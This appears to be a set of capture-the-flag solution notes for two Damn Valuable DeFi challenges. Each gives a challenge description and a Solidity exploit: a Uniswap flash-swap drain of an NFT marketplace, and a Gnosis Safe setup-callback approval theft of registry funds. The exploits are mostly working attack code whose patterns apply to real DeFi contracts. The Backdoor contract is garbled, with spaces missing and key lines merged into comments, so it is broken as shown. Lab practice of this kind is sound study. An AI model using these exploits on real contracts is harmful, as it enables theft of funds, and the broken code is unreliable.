# 9.05

# free-rider

desc

```markdown
# Free Rider

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don't know how to save them!

They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

```

exp

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
  
  FreeRiderBuyer buyer;
  FreeRiderNFTMarketplace marketplace;

  IUniswapV2Pair pair;
  WETH weth;
  DamnValuableNFT nft;
  address attacker;

  uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

  constructor(address _buyer, address payable _marketplace, address _pair, address _weth, address _nft) payable {
    buyer = FreeRiderBuyer(_buyer);
    marketplace = FreeRiderNFTMarketplace(_marketplace);

    pair = IUniswapV2Pair(_pair);
    weth = WETH(_weth);
    nft = DamnValuableNFT(_nft);

    attacker = msg.sender;
  }

  function attack(uint amount) external {
    pair.swap(amount, 0, address(this), "x");
  }

  function uniswapV2Call(
    address sender,
    uint amount0,
    uint amount1,
    bytes calldata data
  ) external {
    // 将借出的 WETH 转成 ETH
    weth.withdraw(amount0);

    marketplace.buyMany{value: amount0}(tokenIds);

    for (uint tokenId = 0; tokenId < tokenIds.length; tokenId++) {
      nft.safeTransferFrom(address(this), address(buyer), tokenId);
    }

    uint fee = amount0 * 3 / 997 + 1;
    weth.deposit{value: fee + amount0}();
    weth.transfer(address(pair), fee + amount0);
    payable(address(attacker)).transfer(address(this).balance);
  }

  receive() external payable {}

  function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
      return IERC721Receiver.onERC721Received.selector;
  }
}

```

# backdoor

desc

```markdown
# Backdoor

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Safe wallets. When someone in the team deploys and registers a wallet, they earn 10 DVT tokens.

The registry tightly integrates with the legitimate Safe Proxy Factory. It includes strict safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Uncover the vulnerability in the registry, rescue all funds, and deposit them into the designated recovery account. In a single transaction.

```

exp

```solidity
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

interface ProxyFactory {
    functioncreateProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract WalletRegistryAttacker {
    address public masterCopyAddress;
    address public walletRegistryAddress;
    ProxyFactory proxyFactory;

    constructor(
        address _proxyFactoryAddress,
        address _walletRegistryAddress,
        address _masterCopyAddress,
        address _token
    ) {
        proxyFactory =ProxyFactory(_proxyFactoryAddress);
        walletRegistryAddress = _walletRegistryAddress;
        masterCopyAddress = _masterCopyAddress;
    }

    functionapprove(address spender, address token) external {
IERC20(token).approve(spender,type(uint256).max);
    }

    functionattack(
        address tokenAddress,
        address hacker,
        address[] calldata users
    ) public {
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;

// 打包approve函数作为data传入setup中bytes memory encodedApprove = abi.encodeWithSignature(
                "approve(address,address)",
                address(this),
                tokenAddress
            );

//执行后将delegatecall最终让钱包将DVT授权给攻击者bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                encodedApprove,
                address(0),
                0,
                0,
                0
            );
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                masterCopyAddress,
                initializer,
                0,
IProxyCreationCallback(walletRegistryAddress)
            );
// 拿到权限后发起转帐IERC20(tokenAddress).transferFrom(address(proxy), hacker, 10 ether);
        }
    }
}
```